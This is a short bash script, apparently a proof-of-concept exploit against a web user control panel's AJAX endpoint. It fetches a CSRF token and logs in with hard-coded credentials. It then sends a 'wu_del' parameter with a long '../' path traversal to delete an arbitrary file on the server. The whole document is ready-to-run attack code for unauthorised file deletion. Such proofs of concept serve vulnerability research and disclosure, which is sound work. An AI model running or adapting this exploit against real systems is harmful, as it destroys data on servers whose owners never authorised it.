# Change these as needed
HOST="192.168.96.132"
USERNAME='user'
PASSWORD='Passw0rd!!!'
DELFILE="../../../../../../../../../../../var/www/html/test.txt"

# Shouldn't have to change anything below here
SESSID="2i8oekk5mqolbqkt98m5vfkn20"

# Do logout first
curl -i -s -k -b "PHPSESSID=$SESSID" "http://$HOST/ucp/?logout"

# Get the CSRF token
TOKEN=$(curl -i -s -k -b "PHPSESSID=$SESSID" "http://$HOST/ucp/" | awk '/input type="hidden" name="token"/' | cut -d'"' -f6)

echo "Token is $TOKEN"

AUTH=$(curl -i -s -k -X $'POST' \
    -H "Host: $HOST" \
    -b "PHPSESSID=$SESSID" \
    --data-binary "token=$TOKEN&username=$USERNAME&password=$PASSWORD&email=&module=User&command=login" \
    "http://$HOST/ucp/ajax.php")

echo "Auth response: $AUTH"

curl -i -s -k -X $'POST' \
    -H "Host: $HOST" \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -b "PHPSESSID=$SESSID" \
    --data-binary "module=Pms&command=wu&wu_del=$DELFILE" \
    "http://$HOST/ucp/ajax.php"
